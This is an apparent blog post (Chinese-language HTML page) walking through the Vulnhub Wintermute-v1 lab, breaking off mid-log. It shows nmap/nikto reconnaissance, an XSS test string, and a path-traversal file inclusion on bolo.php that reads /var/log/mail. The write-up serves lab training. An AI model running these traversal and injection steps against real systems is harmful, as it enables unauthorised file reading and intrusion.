@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulnhub-19Wintermute-v1 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub-19Wintermute-v1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 24, 2024&nbsp;&nbsp;8:50:06</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="19Wintermute-v1"><a href="#19Wintermute-v1" class="headerlink" title="19Wintermute-v1"></a>19Wintermute-v1</h1><p>这次实验我们需要配置两个靶机的网络</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我把两个虚拟机都导入到VirtualBox了，原因是在VMware下报错：Failed to start Raise network interfaces（这个是虚拟机启动页面发现的）</span><br><span class="line">Wintermute-Straylight，它有两个网卡，一个是<span class="number">192.168.1.0</span>/<span class="number">24</span>（桥接到本地网卡了）另一个是<span class="number">192.168.231.0</span>/<span class="number">24</span></span><br><span class="line">Wintermute-Neuromancer，它只有<span class="number">1</span>个网卡  <span class="number">192.168.231.0</span>/<span class="number">24</span></span><br><span class="line">Wintermute-Straylight的ip为<span class="number">192.168.1.108</span> <span class="number">192.168.230.2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们攻击机（win10）的<span class="built_in">IP</span>是<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">240</span> 能够和Straylight直接通信</span><br><span class="line">我们攻击机（kali）的<span class="built_in">IP</span>是<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">241</span> 能够和Straylight直接通信</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arp</span>-scan -l          nmap --min-rate <span class="number">100000</span> -p- <span class="number">192.168.1.108</span>     nmap --min-rate <span class="number">100000</span> -p25,<span class="number">80</span>,<span class="number">3000</span> -A <span class="number">192.168.1.108</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.1.108</span>   dirb  http://<span class="number">192.168.1.108</span>/      nikto -host <span class="number">192.168.1.108</span> -p <span class="number">80</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="25端口"><a href="#25端口" class="headerlink" title="25端口"></a>25端口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">smtp</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.1.108</span>   dirb  http://<span class="number">192.168.1.108</span>/      nikto -host <span class="number">192.168.1.108</span> -p <span class="number">80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.1.108 <span class="comment">[200 OK]</span> Apache<span class="comment">[2.4.25]</span>, Country<span class="comment">[RESERVED]</span><span class="comment">[ZZ]</span>, HTTPServer<span class="comment">[Debian Linux]</span><span class="comment">[Apache/2.4.25 (Debian)]</span>, IP<span class="comment">[192.168.1.108]</span>, Meta-Refresh-Redirect<span class="comment">[xwx.html]</span>, Title<span class="comment">[Night City]</span></span><br><span class="line">http://192.168.1.108/xwx.html <span class="comment">[200 OK]</span> Apache<span class="comment">[2.4.25]</span>, Country<span class="comment">[RESERVED]</span><span class="comment">[ZZ]</span>, HTTPServer<span class="comment">[Debian Linux]</span><span class="comment">[Apache/2.4.25 (Debian)]</span>, IP<span class="comment">[192.168.1.108]</span>, Script</span><br><span class="line">http://192.168.1.108/index.html</span><br><span class="line">http://192.168.1.108/xwx.html</span><br><span class="line">http://192.168.1.108/manual/en/index.html</span><br><span class="line"></span><br><span class="line">http://192.168.1.108/manual/images/</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="3000端口"><a href="#3000端口" class="headerlink" title="3000端口"></a>3000端口</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">dirsearch</span> -u <span class="number">192.168.1.108:3000</span>         nikto -host <span class="number">192.168.1.108</span> -p <span class="number">3000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hadoop-datanode Apache Hadoop</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">1.108</span>:<span class="number">3000</span>/lua/login.lua?referer=/</span><br><span class="line">+ /<span class="number">666</span><span class="meta">%0a</span><span class="meta">%0a</span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="number">666</span>.jsp: Apache Tomcat <span class="number">4.1</span> / Linux <span class="literal">is</span> vulnerable <span class="keyword">to</span> Cross Site Scripting (XSS). </span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">1.108</span>:<span class="number">3000</span>/<span class="number">666</span><span class="meta">%0a</span><span class="meta">%0a</span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="number">666</span>.jsp</span><br><span class="line">上面这个XSS我验证不出来，这里我不是很懂，先跳过去</span><br><span class="line"></span><br><span class="line">ntopng 是一个强大的网络流量监控工具，适用于需要对网络流量进行深入分析和实时监控的场景。它具有丰富的功能和易用的 Web 界面，广泛应用于网络运维、带宽管理、网络安全等领域。这个是个流量设备类似于IPS</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里有提示说有默认的账号密码  先登录再看看</span><br><span class="line">这个机器是两个网卡：enp0s3-<span class="number">192.168</span>.<span class="number">1.0</span><span class="regexp">/24、enp0s8-192.168.230.0/</span><span class="number">24</span>   </span><br><span class="line">我们在网络接口的流量管理发现路径 <span class="regexp">/turing-bolo/</span>  <span class="regexp">/freeside/</span>  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124165130870.png" alt="image-20241124165130870"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.108</span><span class="regexp">/turing-bolo/</span>  这个页面就是调一个人来看日志的，都看一看</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.108</span><span class="regexp">/turing-bolo/</span>bolo.php?bolo=case</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.108</span><span class="regexp">/turing-bolo/</span>bolo.php?bolo=molly</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.108</span><span class="regexp">/turing-bolo/</span>bolo.php?bolo=armitage</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.108</span><span class="regexp">/turing-bolo/</span>bolo.php?bolo=riviera</span><br><span class="line">我们发现实际上给的都包含.log但是?bolg=case没有.log  可能是变量默认后面跟上.log</span><br><span class="line">考虑这里有文件包含，这里我们联想起之前发现的stmp（邮件协议）直接包含一下stmp的日志试一试</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.108</span><span class="regexp">/turing-bolo/</span>bolo.php?bolo=..<span class="regexp">/../</span>..<span class="regexp">/../</span>var<span class="regexp">/log/m</span>ail  这里的../数量纯靠尝试</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124165957162.png" alt="image-20241124165957162"></p>
+<p><img src="/vulnhub-19wintermute-v1//image-20241124170813770.png" alt="image-20241124170813770"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">&lt;br/&gt;</span></span><br><span class="line"><span class="attribute">Jul</span>  <span class="number">1</span> <span class="number">19</span>:<span class="number">10</span>:<span class="number">42</span> straylight postfix/postfix-script[<span class="number">1782</span>]: stopping the Postfix mail system</span><br><span class="line"><span class="attribute">Jul</span>  <span class="number">1</span> <span class="number">19</span>:<span class="number">10</span>:<span class="number">42</span> straylight postfix/master[<span class="number">716</span>]: terminating <span class="literal">on</span> signal <span class="number">15</span></span><br><span class="line"><span class="attribute">Jul</span>  <span class="number">1</span> <span class="number">19</span>:<span class="number">10</span>:<span class="number">43</span> straylight postfix/postfix-script[<span class="number">1945</span>]: starting the Postfix mail system</span><br><span class="line"><span class="attribute">Jul</span>  <span class="number">1</span> <span class="number">19</span>:<span class="number">10</span>:<span class="number">43</span> straylight postfix/master[<span class="number">1947</span>]: daemon started -- version <span class="number">3</span>.<span class="number">1</span>.<span class="number">8</span>, configuration /etc/postfix</span><br><span class="line"><span class="attribute">Jul</span>  <span class="number">3</span> <span class="number">20</span>:<span class="number">26</span>:<span class="number">50</span> straylight postfix/postfix-script[<span class="number">732</span>]: starting the Postfix mail system</span><br><span class="line"><span class="attribute">Jul</span>  <span class="number">3</span> <span class="number">20</span>:<span class="number">26</span>:<span class="number">50</span> straylight postfix/master[<span class="number">734</span>]: daemon started -- version <span class="number">3</span>.<span class="number">1</span>.<span class="number">8</span>, configuration /etc/postfix</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">17</span>:<span class="number">23</span>:<span class="number">05</span> straylight postfix/postfix-script[<span class="number">804</span>]: starting the Postfix mail system</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">17</span>:<span class="number">23</span>:<span class="number">05</span> straylight postfix/master[<span class="number">822</span>]: daemon started -- version <span class="number">3</span>.<span class="number">1</span>.<span class="number">8</span>, configuration /etc/postfix</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">17</span>:<span class="number">37</span>:<span class="number">58</span> straylight postfix/postfix-script[<span class="number">725</span>]: starting the Postfix mail system</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">17</span>:<span class="number">37</span>:<span class="number">58</span> straylight postfix/master[<span class="number">727</span>]: daemon started -- version <span class="number">3</span>.<span class="number">1</span>.<span class="number">8</span>, configuration /etc/postfix</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">16</span> straylight postfix/smtpd[<span class="number">2926</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">16</span> straylight postfix/smtpd[<span class="number">2926</span>]: lost connection after CONNECT from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">16</span> straylight postfix/smtpd[<span class="number">2926</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] commands=<span class="number">0</span>/<span class="number">0</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2926</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2936</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2937</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2936</span>]: SSL_accept error from unknown[<span class="number">192.168.1.240</span>]: -<span class="number">1</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2936</span>]: warning: TLS library problem: error:<span class="number">1417</span>D0FC:SSL routines:tls_process_client_hello:unknown protocol:../ssl/statem/statem_srvr.c:<span class="number">938</span>:</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2936</span>]: lost connection after STARTTLS from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">23</span> straylight postfix/smtpd[<span class="number">2936</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> starttls=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> quit=<span class="number">1</span> unknown=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">2</span>/<span class="number">3</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2926</span>]: lost connection after UNKNOWN from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2926</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">2</span> starttls=<span class="number">1</span> auth=<span class="number">0</span>/<span class="number">1</span> unknown=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">3</span>/<span class="number">5</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2936</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2926</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2938</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2926</span>]: SSL_accept error from unknown[<span class="number">192.168.1.240</span>]: lost connection</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: SSL_accept error from unknown[<span class="number">192.168.1.240</span>]: lost connection</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: lost connection after STARTTLS from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> starttls=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2926</span>]: lost connection after STARTTLS from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2926</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> starttls=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2938</span>]: SSL_accept error from unknown[<span class="number">192.168.1.240</span>]: lost connection</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2938</span>]: lost connection after STARTTLS from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2938</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> starttls=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2936</span>]: lost connection after STARTTLS from unknown[<span 